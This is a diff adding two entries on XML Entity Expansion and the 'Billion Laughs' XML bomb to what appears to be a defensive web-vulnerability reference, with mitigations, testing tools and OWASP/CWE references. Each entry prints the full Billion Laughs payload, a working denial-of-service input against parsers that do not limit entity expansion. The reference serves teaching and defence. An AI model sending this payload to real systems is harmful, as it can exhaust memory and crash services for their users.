@@ -5591,4 +5591,117 @@ Example vulnerable XML input:
 - [OWASP Top 10 2021 - A05: Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
 
 ***
+# Web Vulnerability Entry
+
+## 🏷️ Category
+Injection
+
+## 🆔 Vulnerability ID
+WEBVULN-041
+
+## 🐞 Vulnerability
+**XML Entity Expansion (XEE)**
+
+## 📝 Description
+XEE (XML Entity Expansion) occurs when an XML parser processes documents containing many nested or recursive entity declarations, causing resource exhaustion (e.g., CPU, memory, disk space).  
+This can lead to **Denial of Service (DoS)** attacks, even if external entities (XXE) are properly disabled.
+
+XEE is a form of "Billion Laughs Attack" where a small XML payload can expand into gigabytes of memory consumption, crashing or severely slowing the target application.
+
+---
+
+## 🧪 Demo / Proof of Concept
+
+Example of a **Billion Laughs** attack payload:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+```
+## 🛡️ Mitigation
+- Limit the depth of entity expansion and nesting in XML parsers.
+- Set appropriate limits on memory usage, entity count, and expansion size.
+- Disable DTD (Document Type Definition) processing entirely if not required.
+- Prefer safer data formats like JSON instead of XML when possible.
+- Update XML parsing libraries to versions that defend against entity expansion attacks.
+
+## 🧪 Testing Tools / Techniques
+- Burp Suite (custom XML payloads with heavy nesting)
+- OWASP ZAP
+- Manual testing using crafted XMLs
+- Source code review for XML parser configurations
+- Fuzzing XML inputs with tools like Defensics
+
+## 📚 References
+- [OWASP XML Entity Expansion (XEE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_Entity_Expansion_Prevention_Cheat_Sheet.html)
+- [OWASP Billion Laughs Attack](https://owasp.org/www-community/attacks/Billion_Laughs_Attack)
+- [CWE-776: Improper Restriction of Recursive Entity References in DTDs ('Billion Laughs')](https://cwe.mitre.org/data/definitions/776.html)
+
+***
+# Web Vulnerability Entry
+
+## 🏷️ Category
+Denial of Service (DoS)
+
+## 🆔 Vulnerability ID
+WEBVULN-042
+
+## 🐞 Vulnerability
+**XML Bomb Document (aka "Billion Laughs" attack)**
+
+## 📝 Description
+An **XML Bomb** (also known as **Billion Laughs Attack**) is a form of **Denial of Service (DoS)** attack where an XML document is designed to cause excessive resource consumption by recursively defining entities. A single, small XML payload can recursively expand into an enormous amount of data, causing a system to crash or run out of resources.
+
+This attack relies on exploiting XML parsers that fail to limit entity expansion. The most famous example is the **Billion Laughs Attack**, where the document recursively defines entities in a way that makes it blow up in size when processed.
+
+### Example XML Bomb Payload
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+```
+## 🛡️ Mitigation
+- Limit the number of entities and depth of entity references in XML parsers.
+- Set memory and recursion limits for XML parsers to prevent resource exhaustion.
+- Disable DTD (Document Type Definition) processing when not required.
+- Use alternative formats like JSON or YAML if possible to avoid XML-based attacks.
+- Use libraries that explicitly limit or prevent entity expansion in XML parsing.
+
+## 🧪 Testing Tools / Techniques
+- Burp Suite (with recursive XML payloads)
+- OWASP ZAP
+- Defensics Fuzzing Tool (to generate malicious XML payloads)
+- Manual testing using crafted XML bombs
+- Review XML parser configurations for recursion depth limits
+
+## 📚 References
+- OWASP XML Bomb Prevention Cheat Sheet
+- OWASP Billion Laughs Attack
+- CWE-770: Allocation of Resources Without Limits or Throttling
+- OWASP Top 10 2021 - A06: Vulnerable and Outdated Components
+***
 
